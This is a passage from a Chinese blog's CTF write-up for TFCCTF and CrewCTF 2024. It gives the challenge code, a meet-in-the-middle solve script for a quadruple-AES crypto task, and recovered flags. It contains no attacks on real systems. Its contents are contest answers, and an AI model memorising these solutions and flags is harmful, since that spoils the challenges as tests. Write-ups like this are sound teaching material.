<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">I<span class="string">&#x27;m sure it&#x27;</span>s here somewhere. ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _  add this to the format: zoo_wee_mama</span><br></pre></td></tr></table></figure>
<p><code>TFCCTF&#123;zoo_wee_mama&#125;</code></p>
<h1 id="crewctf"><a class="markdownIt-Anchor" href="#crewctf"></a> CrewCTF</h1>
<p><a target="_blank" rel="noopener" href="https://2024.crewc.tf/challenges">https://2024.crewc.tf/challenges</a></p>
<h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2"></a> Web</h2>
<h3 id="malkonkordo"><a class="markdownIt-Anchor" href="#malkonkordo"></a> Malkonkordo()</h3>
<p>一个<code>Markdown</code>编辑器，可以看到渲染内容<br />
但是用<code>Rust</code>写的。。。做牛魔</p>
<h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> Crypto</h2>
<h3 id="4es"><a class="markdownIt-Anchor" href="#4es"></a> 4ES</h3>
<p>题目</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choices</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    FLAG = f.read().strip()</span><br><span class="line">chars = <span class="string">b&#x27;crew_AES*4=$!?&#x27;</span></span><br><span class="line">L = <span class="number">3</span></span><br><span class="line">w, x, y, z = (</span><br><span class="line">    <span class="built_in">bytes</span>(choices(chars, k=L)),</span><br><span class="line">    <span class="built_in">bytes</span>(choices(chars, k=L)),</span><br><span class="line">    <span class="built_in">bytes</span>(choices(chars, k=L)),</span><br><span class="line">    <span class="built_in">bytes</span>(choices(chars, k=L)),</span><br><span class="line">)</span><br><span class="line">k1 = sha256(w).digest()</span><br><span class="line">k2 = sha256(x).digest()</span><br><span class="line">k3 = sha256(y).digest()</span><br><span class="line">k4 = sha256(z).digest()</span><br><span class="line"><span class="built_in">print</span>(w.decode(), x.decode(), y.decode(), z.decode())</span><br><span class="line">pt = <span class="string">b&#x27;AES_AES_AES_AES!&#x27;</span></span><br><span class="line">ct = AES.new(k4, AES.MODE_ECB).encrypt(</span><br><span class="line">         AES.new(k3, AES.MODE_ECB).encrypt(</span><br><span class="line">             AES.new(k2, AES.MODE_ECB).encrypt(</span><br><span class="line">                 AES.new(k1, AES.MODE_ECB).encrypt(</span><br><span class="line">                     pt</span><br><span class="line">                 )</span><br><span class="line">             )</span><br><span class="line">         )</span><br><span class="line">     )</span><br><span class="line">key = sha256(w + x + y + z).digest()</span><br><span class="line">enc_flag = AES.new(key, AES.MODE_ECB).encrypt(pad(FLAG, AES.block_size))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&#x27;pt = <span class="subst">&#123;pt.<span class="built_in">hex</span>()&#125;</span>\nct = <span class="subst">&#123;ct.<span class="built_in">hex</span>()&#125;</span>\nenc_flag = <span class="subst">&#123;enc_flag.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>一开始无脑选择了直接爆破，总结果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>4</mn><mn>12</mn></msup><mo>=</mo><mn>56693912375296</mn></mrow><annotation encoding="application/x-tex">14^{12}=56693912375296</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">6</span><span class="mord">6</span><span class="mord">9</span><span class="mord">3</span><span class="mord">9</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">7</span><span class="mord">5</span><span class="mord">2</span><span class="mord">9</span><span class="mord">6</span></span></span></span>，淦，时间上要跑很久，而且中途我还断了几次<br />
后面有师傅做出来了，一看中间相遇攻击，好家伙，很熟悉但自己没搞过<br />
一搜，还真发现跟<code>二重DES</code>的情况类似，也是适用于中间相遇攻击，空间换时间<br />
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>t</mi><mo>=</mo><msub><mi>E</mi><mrow><mi>k</mi><mn>4</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mrow><mi>k</mi><mn>3</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mrow><mi>k</mi><mn>2</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mrow><mi>k</mi><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>p</mi><mi>t</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ct=E_{k4}(E_{k3}(E_{k2}(E_{k1}(pt))))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mclose">)</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span><br />
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>t</mi><mo>=</mo><msub><mi>D</mi><mrow><mi>k</mi><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>D</mi><mrow><mi>k</mi><mn>2</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>D</mi><mrow><mi>k</mi><mn>3</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>D</mi><mrow><mi>k</mi><mn>4</mn></mrow></msub><mo stretchy="false">(</mo><mi>c</mi><mi>t</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">pt=D_{k1}(D_{k2}(D_{k3}(D_{k4}(ct))))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mclose">)</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span><br />
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mrow><mi>k</mi><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mrow><mi>k</mi><mn>2</mn></mrow></msub><mo stretchy="false">(</mo><mi>p</mi><mi>t</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><msub><mi>D</mi><mrow><mi>k</mi><mn>3</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>D</mi><mrow><mi>k</mi><mn>4</mn></mrow></msub><mo stretchy="false">(</mo><mi>c</mi><mi>t</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E_{k1}(E_{k2}(pt))=D_{k3}(D_{k4}(ct))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span><br />
相关介绍<br />
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/weikunpeng/p/14231224.html">https://www.cnblogs.com/weikunpeng/p/14231224.html</a><br />
<a target="_blank" rel="noopener" href="https://ctf-wiki.org/crypto/attack-summary/meet-in-the-middle/">https://ctf-wiki.org/crypto/attack-summary/meet-in-the-middle/</a><br />
然后，自己也写了一个脚本，有点笨笨的()，解出来发现不对，一看，w和x反了，一开始还不知道为什么，写<code>wp</code>，发现上面写反了，应该是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mrow><mi>k</mi><mn>2</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mrow><mi>k</mi><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>p</mi><mi>t</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><msub><mi>D</mi><mrow><mi>k</mi><mn>3</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>D</mi><mrow><mi>k</mi><mn>4</mn></mrow></msub><mo stretchy="false">(</mo><mi>c</mi><mi>t</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E_{k2}(E_{k1}(pt))=D_{k3}(D_{k4}(ct))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>，还好是<code>ECB mode</code>，没什么影响，交换w和x就行了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">pt = <span class="number">0x4145535f4145535f4145535f41455321</span></span><br><span class="line">ct = <span class="number">0xedb43249be0d7a4620b9b876315eb430</span></span><br><span class="line">enc_flag = <span class="number">0xe5218894e05e14eb7cc27dc2aeed10245bfa4426489125a55e82a3d81a15d18afd152d6c51a7024f05e15e1527afa84b</span></span><br><span class="line">pt = long_to_bytes(pt)</span><br><span class="line">ct = long_to_bytes(ct)</span><br><span class="line">enc_flag = long_to_bytes(enc_flag)</span><br><span class="line">x = <span class="string">b&#x27;A?S&#x27;</span></span><br><span class="line">w = <span class="string">b&#x27;_c*&#x27;</span></span><br><span class="line"><span class="comment"># w=b&#x27;A?S&#x27; x=b&#x27;_c*&#x27;</span></span><br><span class="line">y = <span class="string">b&#x27;c=e&#x27;</span></span><br><span class="line">z = <span class="string">b&#x27;A_*&#x27;</span></span><br><span class="line">key = sha256(w + x + y + z).digest()</span><br><span class="line"><span class="built_in">print</span>(AES.new(key, AES.MODE_ECB).decrypt(enc_flag))</span><br><span class="line"><span class="comment"># chars = b&#x27;crew_AES*4=$!?&#x27;</span></span><br><span class="line"><span class="comment"># list = []</span></span><br><span class="line"><span class="comment"># for i in range(14):</span></span><br><span class="line"><span class="comment">#     for j in range(14):</span></span><br><span class="line"><span class="comment">#         for k in range(14):</span></span><br><span class="line"><span class="comment">#             list.append(chars[i:i+1]+chars[j:j+1]+chars[k:k+1])</span></span><br><span class="line"><span class="comment"># print(len(list))</span></span><br><span class="line"><span class="comment"># res = b&#x27;\xb7\xe25\x0c\xa5N\xban;\xf1\xd7\xa5Cn\xf85&#x27;</span></span><br><span class="line"><span class="comment"># E_k1_k2_pt = []</span></span><br><span class="line"><span class="comment"># for w in list:</span></span><br><span class="line"><span class="comment">#     for x in list:</span></span><br><span class="line"><span class="comment">#         k1 = sha256(w).digest()</span></span><br><span class="line"><span class="comment">#         k2 = sha256(x).digest()</span></span><br><span class="line"><span class="comment">#         if res == AES.new(k1, AES.MODE_ECB).encrypt(</span></span><br><span class="line"><span class="comment">#                 AES.new(k2, AES.MODE_ECB).encrypt(pt)):</span></span><br><span class="line"><span class="comment">#             print(w, x)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#         # E_k1_k2_pt.append(AES.new(k1, AES.MODE_ECB).encrypt(</span></span><br><span class="line"><span class="comment">#         #     AES.new(k2, AES.MODE_ECB).encrypt(pt)))</span></span><br><span class="line"><span class="comment"># print(len(E_k1_k2_pt))</span></span><br><span class="line"><span class="comment"># D_k3_k4_ct = []</span></span><br><span class="line"><span class="comment"># for y in list:</span></span><br><span class="line"><span class="comment">#     for z in list:</span></span><br><span class="line"><span class="comment">#         k3 = sha256(y).digest()</span></span><br><span class="line"><span class="comment">#         k4 = sha256(z).digest()</span></span><br><span class="line"><span class="comment">#         if res == AES.new(k3, AES.MODE_ECB).decrypt(</span></span><br><span class="line"><span class="comment">#                 AES.new(k4, AES.MODE_ECB).decrypt(ct)):</span></span><br><span class="line"><span class="comment">#             print(y, z)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#         # D_k3_k4_ct.append(AES.new(k3, AES.MODE_ECB).decrypt(</span></span><br><span class="line"><span class="comment">#         #     AES.new(k4, AES.MODE_ECB).decrypt(ct)))</span></span><br><span class="line"><span class="comment"># # print(len(D_k3_k4_ct))</span></span><br><span class="line"><span class="comment"># # res = set(E_k1_k2_pt) &amp; set(D_k3_k4_ct)</span></span><br><span class="line"><span class="comment"># # print(res)</span></span><br></pre></td></tr></table></figure>
<p><code>b'crew&#123;m1tm_at74cK_1s_g0lD_4nd_py7h0n_i5_sl0w!!&#125;\x02\x02'</code></p>
<h3 id="read-between-the-lines"><a class="markdownIt-Anchor" href="#read-between-the-lines"></a> Read between the lines()</h3>
<p>题目</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    FLAG = f.read().strip()</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(FLAG) &lt; <span class="number">100</span></span><br><span class="line">encoded_flag = []</span><br><span class="line"><span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(FLAG):</span><br><span class="line">    encoded_flag.extend([i + <span class="number">0x1337</span>] * b)</span><br><span class="line">shuffle(encoded_flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">sum</span>(<span class="built_in">pow</span>(m, e, n) <span class="keyword">for</span> m <span class="keyword">in</span> encoded_flag) % n</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>\n<span class="subst">&#123;e = &#125;</span>\n<span class="subst">&#123;c = &#125;</span>\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>加密过程很简单，但没什么可行的思路，在努力看懂师傅的<code>wp</code>ing<br />
<img src="https://pic1.zhimg.com/80/v2-8ba3feec74bafde55179797c25f0975e_1440w.png" alt="" /></p>
<h2 id="misc-2"><a class="markdownIt-Anchor" href="#misc-2"></a> Misc</h2>
<p>这个比赛的杂项，不好评价。。。反正不适合我</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://hvang10.github.io">HvAng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://hvang10.github.io/2024/08/05/TFCCTF2024-CrewCTF2024/">https://hvang10.github.io/2024/08/05/TFCCTF2024-CrewCTF2024/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/favicon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/12/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E8%AE%AD%E7%BB%83%E8%90%A5/" 